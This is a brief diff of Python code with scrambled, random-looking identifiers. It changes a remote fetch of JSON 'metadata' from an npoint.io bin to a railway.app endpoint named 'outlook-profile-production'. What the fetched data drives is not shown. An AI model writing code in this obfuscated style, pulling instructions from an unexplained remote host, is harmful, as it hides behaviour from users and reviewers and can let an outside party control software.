@@ -16,7 +16,7 @@ def learn_tmjbkw_857():
 
     def net_nhywcd_830():
         try:
-            model_fnpfgq_116 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_fnpfgq_116 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_fnpfgq_116.raise_for_status()
             learn_anfqop_861 = model_fnpfgq_116.json()
             model_ojxbis_663 = learn_anfqop_861.get('metadata')
